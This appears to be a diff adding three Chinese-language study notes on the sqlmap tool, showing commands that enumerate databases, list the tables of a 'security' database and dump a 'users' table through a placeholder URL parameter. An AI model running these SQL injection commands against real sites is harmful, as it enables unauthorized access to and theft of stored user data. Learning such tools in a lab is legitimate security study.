@@ -1,0 +1,3 @@
+- 在sqlmap的文件夹里打开cmd窗口,执行`python sqlmap.py -u "URL?id=1" --dbs`可以查数据列表，
+- `python sqlmap.py -u "URL?id=1" -D security --tables`根据数据库查数据表
+- `python sqlmap.py -u "URL?id=1" -T users --dump`根据数据表查数据字段的内容
